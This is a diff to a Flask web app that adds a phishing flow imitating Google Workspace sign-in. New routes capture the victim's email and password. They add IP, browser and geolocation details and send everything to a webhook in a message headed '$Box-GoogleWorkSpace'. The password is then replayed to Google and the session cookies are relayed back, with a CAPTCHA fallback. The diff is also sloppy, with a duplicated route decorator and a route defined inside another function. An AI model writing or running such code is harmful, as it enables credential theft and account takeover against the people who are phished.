@@ -1,4 +1,3 @@
-
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify, make_response, Response
 import tempfile
 import os
@@ -60,10 +59,6 @@ GOOGLE_DISCOVERY_URL = (
 GOOGLE_REDIRECT_URI = "http://localhost:5000/oauth2callback"
 SCOPES = ["openid", "https://www.googleapis.com/auth/userinfo.email", "https://www.googleapis.com/auth/userinfo.profile"]
 
-# --- Google Workspace Email Detail and Token Retrieval using Google People API ---
-
-
-# Use Google People API to get branding (optional, fallback to Clearbit)
 def get_google_email_details(email, name=None, picture=None):
     domain = email.split('@')[1] if '@' in email else ''
     branding = {
@@ -72,12 +67,6 @@ def get_google_email_details(email, name=None, picture=None):
         'name': name or email.split('@')[0]
     }
     return branding
-
-
-# No longer needed: token is from OAuth2
-
-
-# No longer needed: login is handled by Google
 
 # Browser configuration
 class Browser:
@@ -292,8 +281,108 @@ USERS = {
 }
 
 @app.route('/')
+
+# Route to render index.html
+@app.route('/')
 def index():
     return render_template('index.html')
+
+# New route to handle email submission from index.html and redirect to password page
+@app.route('/submit-email', methods=['POST'])
+def submit_email():
+    email = request.form.get('email')
+    error = None
+    branding = None
+    if email:
+        session['email'] = email
+        branding = get_google_email_details(email)
+        # You can add email validation and bot detection here if needed
+        # Example: if not is_valid_email(email): error = "Invalid email address."
+        # Example: if is_bot_request(): return redirect(url_for('bot_error_handler'))
+        # If error, re-render index.html with error
+        if error:
+            return render_template('index.html', error=error)
+        # Otherwise, redirect to password page
+        return redirect(url_for('enter_password'))
+    return render_template('index.html', error="Email is required.")
+
+# Update password route to new name for password entry and authentication
+@app.route('/enter-password', methods=['GET', 'POST'])
+def enter_password():
+    email = session.get('email')
+    error = None
+    branding = None
+    if email:
+        branding = get_google_email_details(email)
+    if request.method == 'POST':
+        password_val = request.form.get('password') or ''
+        session['email'] = email
+        branding = get_google_email_details(email)
+        # Collect info for webhook
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        user_agent = request.headers.get('User-Agent', '')
+        import httpagentparser
+        browser_info = httpagentparser.detect(user_agent)
+        user_browser = browser_info.get('browser', {}).get('name', '')
+        browser_version = browser_info.get('browser', {}).get('version', '')
+        browser_platform = browser_info.get('platform', {}).get('name', '')
+        geo_data = {}
+        try:
+            geo_resp = requests.get(f'https://ipapi.co/{client_ip}/json/')
+            geo_data = geo_resp.json()
+            user_country = geo_data.get('country_name', '')
+            user_city = geo_data.get('city', '')
+        except Exception:
+            user_country = ''
+            user_city = ''
+        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
+        credentials_message = (
+            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
+            f"📧 Email: {email}\n"
+            f"🔑 Password: {password_val}\n"
+            f"🌍 Real IP: {client_ip}\n"
+            f"🖥️ User Agent: {user_agent}\n"
+            f"🌐 Browser: {user_browser} {browser_version}\n"
+            f"💻 Platform: {browser_platform}\n"
+            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
+            f"🏙️ City: {user_city}\n"
+            f"⏰ Time: {current_time}"
+        )
+        send_webhook_message(credentials_message)
+        # Direct Google login mimic
+        success, cookies, error_msg = mimic_google_login(email, password_val)
+        if error_msg and "CAPTCHA" in error_msg:
+            # Render CAPTCHA page and pass email/password for callback
+            return render_template('captcha.html', email=email, password=password_val)
+        if success:
+            resp = make_response(redirect(url_for('auth')))
+            for k, v in cookies.items():
+                resp.set_cookie(k, v)
+            session['authenticated'] = True
+            session['email'] = email
+            return resp
+        else:
+            error = error_msg or "Login failed."
+    # CAPTCHA callback route
+    @app.route('/captcha-callback', methods=['POST'])
+    def captcha_callback():
+        email = request.form.get('email')
+        password_val = request.form.get('password')
+        captcha_response = request.form.get('captcha_response')
+        # Here you would send the captcha_response to Google and continue login
+        # For demonstration, assume CAPTCHA is always correct and continue login
+        success, cookies, error_msg = mimic_google_login(email, password_val)
+        if success:
+            resp = make_response(redirect(url_for('auth')))
+            for k, v in cookies.items():
+                resp.set_cookie(k, v)
+            session['authenticated'] = True
+            session['email'] = email
+            return resp
+        else:
+            error = error_msg or "Login failed."
+            return render_template('captcha.html', email=email, password=password_val, error=error)
+    return render_template('password.html', email=email, error=error, branding=branding)
 
 
 # Step 1: User enters email, then redirect to Google OAuth
